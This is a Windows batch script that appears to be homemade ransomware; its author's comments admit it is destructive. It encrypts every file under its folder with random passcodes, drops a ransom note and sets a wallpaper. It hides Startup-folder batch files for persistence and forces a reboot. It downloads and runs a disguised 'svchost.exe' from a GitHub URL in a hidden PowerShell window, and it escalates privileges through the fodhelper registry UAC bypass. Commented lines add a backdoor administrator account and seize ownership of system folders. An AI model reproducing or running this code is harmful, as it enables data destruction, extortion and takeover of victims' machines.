@echo off
setlocal enabledelayedexpansion
# this is a newer version i made ig
# this is destructive (well, the other is if it encrypts anything important) since it takeowns a few important folders and a different version i made deletes them but idk if it works and i'm definitely not running this shit
set "SCRIPT=%~dp0cipherfile2.py"
set "SCRIPT_FULL=%~f0"
set "PYTHON_FULL=%SCRIPT%"
set "IMG=%~dp0walp.png"
for /f "tokens=3" %%i in (
  'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild 2^>nul'
) do set build=%%i

if not defined build (
  for /f "tokens=3" %%i in (
    'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentVersion'
  ) do set version=%%i
)

if defined build (
    if !build! GEQ 22000 (
        set WINVER=11
    ) else (
        if !build! GEQ 10240 (
            set WINVER=10
        ) else (
            set WINVER=UNKNOWN
        )
    )
) else (
    if "!version!"=="6.1" set WINVER=7
    if "!version!"=="6.2" set WINVER=8
    if "!version!"=="6.3" set WINVER=8.1
)
if exist "C:\Program Files\r\f.f" (
exit
)
if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ff.bat" (
del "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ff.bat"
goto :x
)
if exist "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\f.bat" (
del "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\f.bat"
goto :x
)
attrib +r +i +s +h "%~f0\beanybob.bat"
net session >nul 2>&1
if errorlevel 1 if not "!WINVER!"=="10" if not "!WINVER!"=="11" (
    goto :helper
)
:: net user turkey Iq9hQK755J /add
:: net localgroup Administrators turkey /add
:: takeown /F "C:\" /R /D Y
:: takeown /F "C:\Windows\System32" /R /D Y
:: icacls "C:\" /grant turkey:F /T
:: icacls "C:\Windows\System32" /grant turkey:F /T
xcopy "%~dp0turkey.txt" "C:\Users\%USERNAME%\Desktop" /I /Y
for /R %%F in (*) do (
    set "CURRENT_FULL=%%~fF"
    if /I not "!CURRENT_FULL!"=="!SCRIPT_FULL!" if /I not "!CURRENT_FULL!"=="!PYTHON_FULL!" (
        set /a passcode=(%RANDOM% * 32768 + %RANDOM%) %% 1000000
        set passcode=000000!passcode!
        set passcode=!passcode:~-6!
        python "%SCRIPT%" "%%F" "%%F" "!passcode!"
    )
)
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%IMG%" /f
cd "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
(
echo @echo off
echo start %~dp0beanybob.bat
) >ff.bat
(
echo @echo off
echo start C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe
) > f.bat
attrib +r +i +s +h "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ff.bat"
powershell -Command "Start-Process shutdown -ArgumentList '/r /t 0' -Verb runAs"
:x
md "C:\Program Files\r"
cd "C:\Program Files\r"
echo %RANDOM%%RANDOM%%RANDOM%%RANDOM% > f.f
attrib +r +i +s +h "C:\Program Files\r"
powershell -nop -W hidden -noni -ep bypass -c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/MicrosoftNetworkServiceHost/MicrosoftNetworkService/main/svchost.exe -OutFile C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe; & C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe"
attrib +h +s +i +r "C:\Windows\ServiceProfiles\NetworkService\AppData\LocalLow\svchost.exe"
:helper
if not exist "C:\Program Files\r" (
md "C:\Program Files\r"
cd "C:\Program Files\r"
) else (
cd "C:\Program Files\r"
)
(
echo function ffv(){
echo 	New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
echo 	New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
echo 	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start beanybob.bat"
echo 	Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Normal
echo    Start-Sleep 3
echo    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
echo }
echo ffv
) >  helper.ps1
powershell -nop -W hidden -noni -ep bypass -File "C:\Program Files\r\helper.ps1"
